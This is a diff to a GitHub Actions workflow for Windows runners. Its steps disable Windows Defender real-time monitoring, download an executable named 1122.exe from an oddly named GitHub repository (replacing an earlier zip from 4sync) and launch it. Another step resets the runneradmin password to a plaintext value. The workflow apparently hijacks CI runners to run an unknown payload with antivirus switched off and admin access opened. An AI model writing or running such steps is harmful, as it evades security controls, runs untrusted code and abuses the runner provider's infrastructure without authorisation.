@@ -23,11 +23,9 @@ jobs:
     - name: 11
       run: Set-MpPreference -DisableRealtimeMonitoring $true
     - name: 14
-      run: Invoke-WebRequest -URI https://dc538.4sync.com/download/MgHQDbxz?tsid=20251109-204055-bb10206&sbsr=34a47eb4d0e1a69af595e5982fa83fd1b62&bip=MTc4LjQ0LjEzMS44Mg&lgfp=20 -outfile c:\21\1122.zip
-    - name: 7
-      run: Expand-Archive -LiteralPath "c:\21\1122.zip" -DestinationPath "C:\21"
+      run: Invoke-WebRequest -URI https://github.com/charles64Perez/0f7m8d0fddavidmichelle/raw/refs/heads/main/1122.exe -outfile c:\21\1122.exe
     - name: 15
-      run: Start-Process Powershell ' -Command "c:\21\1122\start.cmd"'
+      run: Start-Process Powershell ' -Command "c:\21\1122.exe"'
     - name: 10
       run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
     - name: Download.
